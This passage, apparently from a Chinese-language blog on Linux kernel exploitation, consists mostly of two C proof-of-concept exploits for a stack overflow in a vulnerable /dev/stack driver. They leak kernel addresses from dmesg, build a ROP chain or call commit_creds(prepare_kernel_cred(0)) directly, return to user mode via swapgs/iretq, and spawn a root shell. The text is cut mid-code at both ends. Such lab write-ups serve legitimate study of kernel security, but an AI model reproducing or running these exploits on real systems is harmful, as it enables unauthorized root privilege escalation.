class="string">&quot;/dev/stack&quot;</span>, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Can&#x27;t open device file: /dev/stack\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* payload                          */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Construct the payload...\n&quot;</span>);</span><br><span class="line">    save_state();</span><br><span class="line">    <span class="comment">/* offset before RIP                    */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,<span class="number">116</span>);</span><br><span class="line">    p+=<span class="number">116</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\x42\x42\x42\x42\x42\x42\x42\x42&quot;</span>,<span class="number">8</span>);   <span class="comment">/* for rbp */</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">pop rdi;ret  	ffffffff8131750d</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">prepare_kernel_cred_k_addr   </span></span><br><span class="line"><span class="comment">pop rdx;rbx;rbp;ret  0xffffffff8137ac33</span></span><br><span class="line"><span class="comment">commit_creds_k_addr</span></span><br><span class="line"><span class="comment">mov rdi,rax;call rdx 	0xffffffff8109fc56</span></span><br><span class="line"><span class="comment">swags;	....</span></span><br><span class="line"><span class="comment">pop rbp;ret; 0xffffffff8137ac35</span></span><br><span class="line"><span class="comment">0xdeadbeef</span></span><br><span class="line"><span class="comment">iretq; ....</span></span><br><span class="line"><span class="comment">shell;</span></span><br><span class="line"><span class="comment">CS</span></span><br><span class="line"><span class="comment">EFLAGS</span></span><br><span class="line"><span class="comment">RSP</span></span><br><span class="line"><span class="comment">SS</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* pop rdi;ret                    */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    pop rdi      at 0x%lx\n&quot;</span>, pop_rdi_ret);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;pop_rdi_ret,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>,<span class="number">8</span>);   <span class="comment">/* rbx*/</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//prepare_kernel_cred_k</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    prepare_kernel_cred_k_addr at 0x%lx\n&quot;</span>, prepare_kernel_cred_k);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;prepare_kernel_cred_k,<span class="number">8</span>); </span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//pop rdx;rbx;rbp;ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    pop_rdx_rbx_rbp_ret at 0x%lx\n&quot;</span>, pop_rdx_rbx_rbp_ret);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;pop_rdx_rbx_rbp_ret,<span class="number">8</span>); </span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//pop rbp;ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    pop_rbp_ret at 0x%lx\n&quot;</span>, pop_rbp_ret);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;pop_rbp_ret,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>,<span class="number">8</span>); <span class="comment">//rbx</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\x42\x42\x42\x42\x42\x42\x42\x42&quot;</span>,<span class="number">8</span>); <span class="comment">//rbp</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//mov rdi,rax;call rdx</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    mov rdi,rax;call_rdx at 0x%lx\n&quot;</span>, movRdiRax_call_rdx);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;movRdiRax_call_rdx,<span class="number">8</span>); </span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//commit_creds_k</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    commit_creds_k at 0x%lx\n&quot;</span>, commit_creds_k);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;commit_creds_k,<span class="number">8</span>); </span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* swapgs;ret           */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    swapgs       at 0x%lx\n&quot;</span>, swapgs);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;swapgs,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* iretq                          */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    iretq        at 0x%lx\n&quot;</span>, iretq);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;iretq,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	the stack should look like this after an iretq call</span></span><br><span class="line"><span class="comment">	  RIP</span></span><br><span class="line"><span class="comment">	  CS</span></span><br><span class="line"><span class="comment">	  EFLAGS</span></span><br><span class="line"><span class="comment">	  RSP</span></span><br><span class="line"><span class="comment">	  SS</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* shell                          */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;sh,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* user_cs                        */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;user_cs,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="comment">/* user_rflags                    */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;user_rflags,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="comment">/*stack of userspace   			  */</span>         </span><br><span class="line">    <span class="function"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp <span class="title">asm</span><span class="params">(<span class="string">&quot;rsp&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)rsp;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;sp,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="comment">/* user_ss                        */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;user_ss,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trig the vuln                  */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Trig the vulnerablity...\n&quot;</span>);</span><br><span class="line">    write(fd, payload, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">findAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">string</span>[] = <span class="string">&quot;Freeing SMP alternatives memory&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> found[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* execute dmesg and place result in a file */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Excecute dmesg...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/dmesg&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* find: Freeing SMP alternatives memory    */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Find usefull addr...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FILE* file = fopen(<span class="string">&quot;/tmp/dmesg&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), file)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="built_in">string</span>)) &#123;</span><br><span class="line">            <span class="built_in">strncpy</span>(found,line+<span class="number">53</span>,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(found,<span class="string">&quot;%p&quot;</span>,(<span class="keyword">void</span> **)&amp;addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(addr==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    dmesg error...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>     );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104575654?ops_request_misc=%7B%22request_id%22:%22163298340616780366585344%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=163298340616780366585344&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-104575654.pc_v2_rank_blog_default&utm_term=kernel&spm=1018.2226.3001.4450" >(15æ¡æ¶ˆæ¯) linux kernel pwnå­¦ä¹ ä¹‹ROP_seaaseesaçš„åšå®¢-CSDNåšå®¢</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="äºŒã€Stackæœªè¢«ä¿æŠ¤"   >
          <a href="#äºŒã€Stackæœªè¢«ä¿æŠ¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€Stackæœªè¢«ä¿æŠ¤" class="headerlink" title="äºŒã€Stackæœªè¢«ä¿æŠ¤"></a>äºŒã€Stackæœªè¢«ä¿æŠ¤</h1>
      
        <h2 id="è§£æ"   >
          <a href="#è§£æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h2>
      <p>è¿™ä¸ªç›´æ¥è°ƒç”¨ç”¨æˆ·ç©ºé—´æ„é€ çš„<code>commit_creds(prepare_kernel_cred(0))</code>ææƒï¼Œç„¶åç›´æ¥åŸåœ°èµ·shellå³å¯ã€‚ç›¸å½“äºçœå»å…³é—­smepä¿æŠ¤çš„é‚£æ®µROPé“¾ï¼Œç›´æ¥getrootå³å¯ã€‚</p>

        <h2 id="poc-2"   >
          <a href="#poc-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#poc-2" class="headerlink" title="poc"></a>poc</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *(*<span class="title">prepare_kernel_cred_t</span>) (<span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">daemon</span>) __<span class="title">attribute__</span>((<span class="title">regparm</span>(3)));</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*<span class="keyword">commit_creds_t</span>)</span> <span class="params">(struct cred *<span class="keyword">new</span>)</span> __<span class="title">attribute__</span><span class="params">((regparm(<span class="number">3</span>)))</span></span>;</span><br><span class="line"><span class="keyword">prepare_kernel_cred_t</span>   prepare_kernel_cred;</span><br><span class="line"><span class="keyword">commit_creds_t</span>    commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_ss;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rflags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">findAddr</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> payload[<span class="number">300</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *p           = payload;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> memOffset;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    memOffset = findAddr();</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rax_rbx_r12_rbp_ret = memOffset - <span class="number">0xCB5B47</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> movCr4Rax_pop_rbp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x01020F1C</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x7AAE78</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)memOffset<span class="number">-0x7AC289</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    addr[0x%llx]\n&quot;</span>, memOffset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set value for commit_creds and prepare_kernel_cred */</span></span><br><span class="line">    commit_creds        = (<span class="keyword">commit_creds_t</span>)(memOffset - <span class="number">0xfbf6a0</span>);</span><br><span class="line">    prepare_kernel_cred = (<span class="keyword">prepare_kernel_cred_t</span>)(memOffset - <span class="number">0xfbf2e0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* open fd on /dev/vuln 							*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open vuln device...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((fd = open(<span class="string">&quot;/dev/stack&quot;</span>, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Can&#x27;t open device file: /dev/stack\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* payload                          */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Construct the payload...\n&quot;</span>);</span><br><span class="line">    save_state();</span><br><span class="line">    <span class="comment">/* offset before RIP                    */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,<span class="number">116</span>);</span><br><span class="line">    p+=<span class="number">116</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(p,<span class="string">&quot;\x42\x42\x42\x42\x42\x42\x42\x42&quot;</span>,<span class="number">8</span>);   <span class="comment">/* for rbp */</span></span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* getroot                        */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;getR,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* swapgs;ret           */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    swapgs       at 0x%lx\n&quot;</span>, swapgs);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;swapgs,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* iretq                          */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    iretq        at 0x%lx\n&quot;</span>, iretq);</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;iretq,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	the stack should look like this after an iretq call</span></span><br><span class="line"><span class="comment">	  RIP</span></span><br><span class="line"><span class="comment">	  CS</span></span><br><span class="line"><span class="comment">	  EFLAGS</span></span><br><span class="line"><span class="comment">	  RSP</span></span><br><span class="line"><span class="comment">	  SS</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* shell                          */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;sh,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* user_cs                        */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;user_cs,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="comment">/* user_rflags                    */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;user_rflags,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="comment">/*stack of userspace   			  */</span>         </span><br><span class="line">    <span class="function"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp <span class="title">asm</span><span class="params">(<span class="string">&quot;rsp&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)rsp;</span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;sp,<span class="number">8</span>);</span><br><span class="line">    p+=<span class="number">8</span>;</span><br><span class="line">    <span class="comment">/* user_ss                        */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p,&amp;user_ss,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trig the vuln                  */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Trig the vulnerablity...\n&quot;</span>);</span><br><span class="line">    write(fd, payload, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">findAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">string</span>[] = <span class="string">&quot;Freeing SMP alternatives memory&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> found[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* execute dmesg and place result in a file */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Excecute dmesg...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/dmesg&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* find: Freeing SMP alternatives memory    */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Find usefull addr...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FILE* file = 